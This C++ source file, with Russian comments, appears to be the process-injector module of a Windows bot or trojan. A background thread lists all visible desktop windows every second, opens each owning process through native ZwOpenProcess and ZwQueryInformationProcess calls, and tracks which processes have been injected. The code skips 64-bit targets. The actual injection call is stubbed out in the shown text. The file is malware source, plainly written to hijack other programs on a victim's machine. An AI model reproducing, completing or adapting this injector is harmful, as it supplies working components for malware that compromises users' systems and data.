//---------------------------------------------------------------------------

#pragma hdrstop

#include "AppInjector.h"
#include "BotCore.h"
#include "Inject.h"
#include "WndUtils.h"
#include "Utils.h"
//---------------------------------------------------------------------------

namespace INJECTOR
{
	typedef struct TInjector
	{
		bool      IsWin64;  // Признак того, что процесс работает в 64 битной вине
		TBotList* Injected; // Список процессов, в которые был совершён инжект
	} *PInjector;


	typedef struct TProcessInfo
	{
		DWORD    PID;
		BOOL     IsWOW64;
		wstring  ExeName;
	} *PProcessInfo;



	DWORD WINAPI InjectorProc(LPVOID);
	BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param);
	bool GetProcessInfo(DWORD PID, TProcessInfo &Info);
}


//------------------------------------------------------
//  StartInjector - Функция стартует процесс инжектора
//------------------------------------------------------
void StartInjector()
{
	StartThread(INJECTOR::InjectorProc, NULL);
//	MegaJump(IJECTOR::InjectorProc);
}



//------------------------------------------------------
//  InjectorProc - Основная функция инжектора, которая
//                 постоянно мониторит запущенные процессы
//------------------------------------------------------
DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
{
	// Алгоритм работы следующий:
	// Перебираем все кна рабочего стола и инжектимся
	// в поцесы владельцы
	BOT::Initialize();

	TInjector Injector;
	Injector.IsWin64  = IsWIN64();
    Injector.Injected = new TBotList();

	while (!BOT::Terminated())
	{
		// Перебираем главные окна окна
		pEnumWindows(WndEnumCallBak, &Injector);
		pSleep(1000);
	}

	// При завершении работы выходим из процесса
	pExitProcess(0);
	return 0;
}

//------------------------------------------------------
// GetProcessInfo - Функция полуает информацию о прцессе
//------------------------------------------------------
bool INJECTOR::GetProcessInfo(DWORD PID, TProcessInfo &Info)
{
	ClearStruct(Info);
	Info.PID = PID;
	// Открываем процесс
	CLIENT_ID ClientID;
	ClientID.UniqueProcess = (HANDLE)PID;
	ClientID.UniqueThread  = 0;

    OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;

	HANDLE Process;
	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
		return false;

	// Определяем кк запущен процесс
	pIsWow64Process(Process, &Info.IsWOW64);

	// Получаем имя процесса
	TMemory Buf((MAX_PATH + 1) * sizeof(WCHAR) + sizeof(UNICODE_STRING));

	PCHAR Tmp = Buf.AsStr();
	PUNICODE_STRING Str = (PUNICODE_STRING)Tmp;
	Str->Length = 0;
	Str->MaximumLength = MAX_PATH * sizeof(wchar_t);

	Tmp += sizeof(UNICODE_STRING);

	Str->Buffer = (PWSTR)Tmp;
	ULONG Len = Str->MaximumLength;

	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
	{
		// Успешно получили имя процесса
		Info.ExeName = Str->Buffer;
	}


	// Закрываем процесс
	pZwClose(Process);
    return true;
}


//------------------------------------------------------
//  WndEnumCallBak - Функция обработки найденного окна
//------------------------------------------------------
BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
{
	// Окно должно быть видимым и не иметь владельца
	if (pIsWindowVisible(Wnd) && !pGetWindow(Wnd, GW_OWNER))
	{
		// Получаем пид пресса которому принадлежит окно
		DWORD PID = 0;
		pGetWindowThreadProcessId(Wnd, &PID);
		if (PID)
		{
			string Text = GetWndText2(Wnd);

			PInjector Injector = (PInjector)Param;

			TProcessInfo Info;
			GetProcessInfo(PID, Info);

			// Проверяем необходимость инжекта
			// Разрешаем инжект в 32 разрядной винде или в 32 разрядные процессы
			bool CanInject = !Injector->IsWin64 || IsWOW64(PID);

			//проверяем не инжектились ли в данный процесс
			if (CanInject)
				CanInject = false;

        }
    }

	return TRUE;
}
